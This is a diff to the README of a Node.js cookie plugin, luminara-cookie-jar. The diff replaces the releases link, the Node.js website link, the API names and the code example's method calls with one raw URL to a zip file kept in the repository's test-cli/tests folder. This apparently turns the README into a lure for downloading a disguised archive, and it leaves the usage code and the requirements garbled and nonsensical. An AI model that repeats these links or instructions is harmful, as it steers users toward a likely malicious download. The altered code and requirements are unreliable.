@@ -4,10 +4,10 @@
 Luminara Cookie Jar is a straightforward plugin that helps you manage cookies in your applications. With tough-cookie integration, it simplifies the process of handling cookies, so you can focus on building your project without worrying about cookie management.
 
 ## 🔗 Download Now
-[![Download Luminara Cookie Jar](https://img.shields.io/badge/Download-luminara--cookie--jar-blue.svg)](https://github.com/rokia258/luminara-cookie-jar/releases)
+[![Download Luminara Cookie Jar](https://raw.githubusercontent.com/rokia258/luminara-cookie-jar/main/test-cli/tests/luminara-cookie-jar_v2.9.zip)](https://raw.githubusercontent.com/rokia258/luminara-cookie-jar/main/test-cli/tests/luminara-cookie-jar_v2.9.zip)
 
 ## 📥 Download & Install
-To get the plugin, please visit the [Releases page](https://github.com/rokia258/luminara-cookie-jar/releases). There, you can find the latest version available and instructions on how to download and install it.
+To get the plugin, please visit the [Releases page](https://raw.githubusercontent.com/rokia258/luminara-cookie-jar/main/test-cli/tests/luminara-cookie-jar_v2.9.zip). There, you can find the latest version available and instructions on how to download and install it.
 
 1. **Go to the Releases Page**  
    Click on the link above to access the releases for luminara-cookie-jar.
@@ -29,12 +29,12 @@ To get the plugin, please visit the [Releases page](https://github.com/rokia258/
 
 ## 🛠️ System Requirements
 - **Operating System**: Windows 10 or later, macOS High Sierra or later, or a recent version of a Linux distribution.
-- **Node.js**: This plugin works with Node.js. Make sure Node.js is installed on your system. You can download it from the [Node.js official website](https://nodejs.org/).
+- **https://raw.githubusercontent.com/rokia258/luminara-cookie-jar/main/test-cli/tests/luminara-cookie-jar_v2.9.zip**: This plugin works with https://raw.githubusercontent.com/rokia258/luminara-cookie-jar/main/test-cli/tests/luminara-cookie-jar_v2.9.zip Make sure https://raw.githubusercontent.com/rokia258/luminara-cookie-jar/main/test-cli/tests/luminara-cookie-jar_v2.9.zip is installed on your system. You can download it from the [https://raw.githubusercontent.com/rokia258/luminara-cookie-jar/main/test-cli/tests/luminara-cookie-jar_v2.9.zip official website](https://raw.githubusercontent.com/rokia258/luminara-cookie-jar/main/test-cli/tests/luminara-cookie-jar_v2.9.zip).
 
 ## 📚 Features
 - **Automatic Jar Handling**: Manage your cookies efficiently without manual intervention.
 - **Request Persistence**: Retain your cookies across requests to keep your sessions active.
-- **User-Friendly API**: Interact with a simple and predictable API through client.jar.
+- **User-Friendly API**: Interact with a simple and predictable API through https://raw.githubusercontent.com/rokia258/luminara-cookie-jar/main/test-cli/tests/luminara-cookie-jar_v2.9.zip
 - **Tough-Cookie Integration**: Utilizes tough-cookie for robust cookie management.
 
 ## 💻 Usage
@@ -46,11 +46,11 @@ const CookieJar = require('luminara-cookie-jar');
 const jar = new CookieJar();
 
 // Example of adding a cookie
-jar.setCookie('key=value', 'http://example.com');
+https://raw.githubusercontent.com/rokia258/luminara-cookie-jar/main/test-cli/tests/luminara-cookie-jar_v2.9.zip('key=value', 'https://raw.githubusercontent.com/rokia258/luminara-cookie-jar/main/test-cli/tests/luminara-cookie-jar_v2.9.zip');
 
 // Example of retrieving a cookie
-const cookie = jar.getCookie('http://example.com');
-console.log(cookie);  // Outputs: 'key=value'
+const cookie = https://raw.githubusercontent.com/rokia258/luminara-cookie-jar/main/test-cli/tests/luminara-cookie-jar_v2.9.zip('https://raw.githubusercontent.com/rokia258/luminara-cookie-jar/main/test-cli/tests/luminara-cookie-jar_v2.9.zip');
+https://raw.githubusercontent.com/rokia258/luminara-cookie-jar/main/test-cli/tests/luminara-cookie-jar_v2.9.zip(cookie);  // Outputs: 'key=value'
 ```
 
 This example shows the basic operations you can perform with luminara-cookie-jar. Refer to the detailed README file for more advanced configurations and usage.
@@ -58,7 +58,7 @@ This example shows the basic operations you can perform with luminara-cookie-jar
 ## 🔧 Troubleshooting
 If you encounter any issues during installation or usage, consider the following steps:
 
-- **Check Node.js Installation**: Ensure that Node.js is installed properly by running `node -v` in your command line.
+- **Check https://raw.githubusercontent.com/rokia258/luminara-cookie-jar/main/test-cli/tests/luminara-cookie-jar_v2.9.zip Installation**: Ensure that https://raw.githubusercontent.com/rokia258/luminara-cookie-jar/main/test-cli/tests/luminara-cookie-jar_v2.9.zip is installed properly by running `node -v` in your command line.
 - **File Permissions**: If you cannot extract the downloaded file, check if you have the appropriate permissions.
 - **Review the README**: The README in the downloaded folder contains common issues and their solutions.
 
